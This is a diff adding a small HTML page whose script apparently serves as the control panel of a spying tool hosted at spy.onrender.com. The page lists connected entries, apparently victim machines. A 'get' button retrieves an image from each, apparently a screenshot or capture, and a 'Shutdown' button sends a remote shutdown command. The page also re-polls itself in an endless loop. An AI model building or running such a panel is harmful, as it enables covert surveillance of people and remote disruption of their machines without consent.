@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+
+<html>
+    <head>
+
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <title>shakti</title>
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <link rel="stylesheet" href="">
+        
+    </head>
+    <style>
+        .Centerdiv {
+            text-align: center;
+            /* background-color: red; */
+            /* display: inline-block; */
+        }
+        .Centerdiv div {
+            margin: 1rem 0.5rem;
+        }
+        .Centerdiv span {
+            margin: 0 0.5rem;
+        }
+        
+    </style>
+    <body>
+        <div class="Centerdiv" id="damn">
+
+           
+            
+            <!-- <img id="img" src="https://img.freepik.com/free-vector/large-school-building-scene_1308-32058.jpg?w=2000" height="300" width="600"/> -->
+        </div>
+        <div>
+<img id="img" src="">
+
+        </div>
+        <script src="" async defer></script>
+    </body>
+
+<script>
+
+var imurl="https://spy.onrender.com/allreq";
+var count = 0;
+
+
+async function lol(){
+    if(count==1){ imurl="https://spy.onrender.com/imreq";}
+let resp= await fetch(imurl);
+count=1;
+resp=await resp.json()
+document.getElementById("damn").innerHTML=''
+console.log(resp)
+for(let i=0;i<resp.length;i++){
+
+
+
+let btn=document.createElement("BUTTON");
+btn.innerHTML="get";
+btn.onclick=async function(){
+
+
+   
+
+    // document.getElementById("he").innerHTML=`${i}`
+    await fetch(`https://spy.onrender.com/accept/${resp[i]}/get`)
+    
+
+
+    setTimeout(async () => {
+        const response = await fetch("https://spy.onrender.com/img");
+     let data = await response.blob();
+     
+const imageObjectURL = URL.createObjectURL(data);
+      
+  document.getElementById("img").src=imageObjectURL;
+      
+    }, 2000);
+    
+}
+
+let btn2=document.createElement("BUTTON");
+btn2.innerHTML="Shutdown";
+btn2.onclick=async function(){
+
+
+   
+
+// document.getElementById("he").innerHTML=`${i}`
+await fetch(`https://spy.onrender.com/accept/${resp[i]}/shut`)}
+
+
+let s=document.createElement("SPAN")
+s.innerHTML=resp[i]
+let d=document.createElement("div")
+d.appendChild(s)
+d.appendChild(btn)
+d.appendChild(btn2)
+
+document.getElementById("damn").appendChild(d)
+
+
+
+}
+lol();
+}
+lol();
+
+// setInterval(() => {
+    
+//     lol();  
+//     console.log("damn")
+// },10000);
+
+
+
+
+
+</script>
+
+</html>
